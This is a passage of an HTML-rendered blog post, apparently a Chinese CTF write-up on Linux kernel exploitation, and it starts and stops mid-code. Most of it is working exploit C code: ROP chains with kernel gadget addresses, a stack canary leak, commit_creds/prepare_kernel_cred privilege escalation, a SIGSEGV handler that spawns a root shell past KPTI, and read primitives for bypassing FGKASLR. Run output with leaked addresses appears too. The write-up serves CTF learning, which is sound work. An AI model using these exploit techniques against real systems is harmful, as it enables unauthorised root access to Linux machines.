payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  <span class=\"comment\">// StackPivot(canary);</span></span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp2-signal-sigsegv\"><a class=\"markdownIt-Anchor\" href=\"#exp2-signal-sigsegv\">#</a> exp2 - signal SIGSEGV</h2>\n<p>在开启 KPTI 内核，提权返回到用户态（iretq/sysret）之前如果不设置 CR3 寄存器的值，<br>\n就会导致进程找不到当前程序的正确页表，引发段错误，程序退出。<br>\n不过可以用 signal hook 掉这个信号 实现 getshell。<br>\n其实只是简单的在普通没开 KPTI 的 <code>swapgs/iretq</code>  的基础上加一行 <code>signal(SIGSEGV, getShell);</code>  即可</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  signal(SIGSEGV, getShell);</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">  u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">  u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">  u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">  u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = iretq;</span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"增加smap\"><a class=\"markdownIt-Anchor\" href=\"#增加smap\">#</a> 增加 SMAP</h1>\n<p><strong>Supervisor Mode Access Prevention</strong><br>\nmarks all the userland pages in the page table as non-accessible when the process is in kernel-mode，<br>\nby setting the  <code>21st bit</code>  of Control Register  <code>CR4</code> .</p>\n<p>对用户态的一切读写都将失效，<br>\n对 ROP 依旧也用，但是栈迁移不行了</p>\n<h1 id=\"再加上kaslr保护开满\"><a class=\"markdownIt-Anchor\" href=\"#再加上kaslr保护开满\">#</a> 再加上 KASLR 保护开满</h1>\n<p>其实我觉得就多泄漏一个 base 之外和之前的 ROP 没啥区别了，不过事情没我想的这么简单<br>\n这里其实还有个保护 叫做 <code>Function Granular KASLR</code>  会打乱函数到内核基址的偏移，也就是上面遇到的 rearrange<br>\n<a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/\">FGKASLR - CTF Wiki</a><br>\n 根据 wiki 和文章 可以得知</p>\n<ul>\n<li>__ksymtab 不会参与随机化</li>\n<li>.data 不会参与随机化</li>\n<li>The functions from  <code>_text</code>  base to  <code>__x86_retpoline_r15</code> , which is  <code>_text+0x400dc6</code>  are unaffected.<br>\n 这个段落包括</li>\n<li>swapgs_restore_regs_and_return_to_usermode，该部分的代码可以帮助我们绕过 KPTI 防护</li>\n<li>memcpy 内存拷贝</li>\n<li>sync_regs，可以把 RAX 放到 RDI 中</li>\n</ul>\n<p>不会参与随机化的部分 有以下的 gadgets</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 pop_rax_ret = kernel_base + <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 read_mem_pop1_ret = kernel_base + <span class=\"number\">0x4aae</span>; <span class=\"comment\">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class=\"line\">u64 pop_rdi_rbp_ret = kernel_base + <span class=\"number\">0x38a0</span>; <span class=\"comment\">// pop rdi; pop rbp; ret;</span></span><br></pre></td></tr></table></figure>\n<p>1 和 2 的 gadget 构成了任意地址读写的 primitive<br>\n 对于 <code>kernel_table</code> , 就是 <code>ksymtab</code>  里的每一项，这个到内核基址是固定的。<br>\n他记录的符号表的偏移（通过 ksymtab 看到的）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kernel_symbol</span> &#123;</span></span><br><span class=\"line\">\t  <span class=\"type\">int</span> value_offset;    [<span class=\"number\">1</span>] &lt;&lt;- 真正有用的</span><br><span class=\"line\">\t  <span class=\"type\">int</span> name_offset;</span><br><span class=\"line\">\t  <span class=\"type\">int</span> namespace_offset;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>sync_regs 如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0xffffffff8100aec0</span>:  push   rbp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aec1</span>:  mov    rbp,rsp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aec4</span>:  mov    rax,QWORD PTR gs:[rip+<span class=\"number\">0x7effb140</span>]        # <span class=\"number\">0x600c</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aecc</span>:  sub    rax,<span class=\"number\">0xa8</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed2</span>:  cmp    rax,rdi</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed5</span>:  je     <span class=\"number\">0xffffffff8100aee5</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed7</span>:  mov    rsi,rdi</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aeda</span>:  mov    ecx,<span class=\"number\">0x15</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aedf</span>:  mov    rdi,rax                                     [<span class=\"number\">1</span>] &lt;&lt;- 个人觉得从这里开始比较好</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee2</span>:  rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee5</span>:  pop    rbp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee6</span>:  ret </span><br></pre></td></tr></table></figure>\n<p>通过不断的调整位置 打印寻找 终于找到了合适的地址 leak</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ ./exp </span><br><span class=\"line\">[+] saveState done</span><br><span class=\"line\">[+] open_dev() done</span><br><span class=\"line\">[*] rfk start</span><br><span class=\"line\">[+] rfk done</span><br><span class=\"line\">[*] canary is <span class=\"number\">0x9292ebeb2e24af00</span></span><br><span class=\"line\">p[<span class=\"number\">1</span>] : <span class=\"number\">0x19</span></span><br><span class=\"line\">p[<span class=\"number\">10</span>] : <span class=\"number\">0xffffffff8184e047</span></span><br><span class=\"line\">p[<span class=\"number\">11</span>] : <span class=\"number\">0xffffffff8184e047</span></span><br><span class=\"line\">p[<span class=\"number\">20</span>] : <span class=\"number\">0xffffffff816d51ff</span></span><br><span class=\"line\">p[<span class=\"number\">27</span>] : <span class=\"number\">0xffffffff816d5727</span></span><br><span class=\"line\">p[<span class=\"number\">28</span>] : <span class=\"number\">0xffffffff8152b8a1</span></span><br><span class=\"line\">p[<span class=\"number\">38</span>] : <span class=\"number\">0xffffffff8100a157</span>   &lt;&lt;- 这逼东西</span><br><span class=\"line\">p[<span class=\"number\">51</span>] : <span class=\"number\">0x19</span></span><br><span class=\"line\">p[<span class=\"number\">56</span>] : <span class=\"number\">0x3</span></span><br><span class=\"line\">p[<span class=\"number\">59</span>] : <span class=\"number\">0x33</span></span><br></pre></td></tr></table></figure>\n<p>这里构造了两个原语 一个实现任意地址读写的原语 一个实现了 f (x) 的函数调用的原语，<br>\n分别是用来读取 <code>ksymtab</code>  和实现 <code>cc(pkc)</code>  的。</p>\n<h2 id=\"两个原语\"><a class=\"markdownIt-Anchor\" href=\"#两个原语\">#</a> 两个原语</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_addr_primitive</span><span class=\"params\">(<span class=\"type\">char</span> *addr, <span class=\"type\">void</span> (*f)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret;</span><br><span class=\"line\">  payload[off++] = addr - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">  payload[off++] = read_mem_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = f;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里会将 rax 作为指定内存读出来的地址，也就是 <code>kernel_symbol</code>  中的 <code>value_offset</code>  值，<br>\n然后和对应的 <code>__ksymtab_symname</code>  的地址加起来就是我们要的最终函数的偏移。<br>\n由于是 rip 直接切换为 f 没有在栈上留下返回地址 所以这个是不能返回的 也就是 Done 这个函数压根执行不到。<br>\n所以只能层层递归套娃。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fn_rdi_ret_primitive</span><span class=\"params\">(<span class=\"type\">void</span> (*fn)(), u64 rdi, <span class=\"type\">void</span> (*ret)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class=\"line\">  payload[off++] = rdi;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = fn;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = ret;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种只要有能控制 rdi 的 gadget 就行， 然后两个原语每次读出来的值都用 rax 保存后用汇编给到我们的指定寄存器。<br>\n对于 <code>prepare_kernel_cred</code> , 返回的是一个 <code>cred</code>  结构体，可以用临时变量存储即可。然后注意一点，rax 弄好了就别打印输出东西了，<br>\n否则会毁坏掉 rax 的内容。<br>\n这里还一个疑点， <code>kpti_trampoline</code>  之后有个 pop rax ，会破坏掉原语创造的 rax</p>\n<h2 id=\"exp1\"><a class=\"markdownIt-Anchor\" href=\"#exp1\">#</a> exp1</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> u64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> fd;</span><br><span class=\"line\">u64 write_addr, read_addr;</span><br><span class=\"line\">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class=\"line\"><span class=\"type\">void</span> (*rfap)(<span class=\"type\">char</span> *, <span class=\"type\">void</span> (*)());</span><br><span class=\"line\"><span class=\"type\">void</span> (*frrp)(<span class=\"type\">void</span> (*)(), u64, <span class=\"type\">void</span> (*)());</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__ (</span><br><span class=\"line\">    <span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span 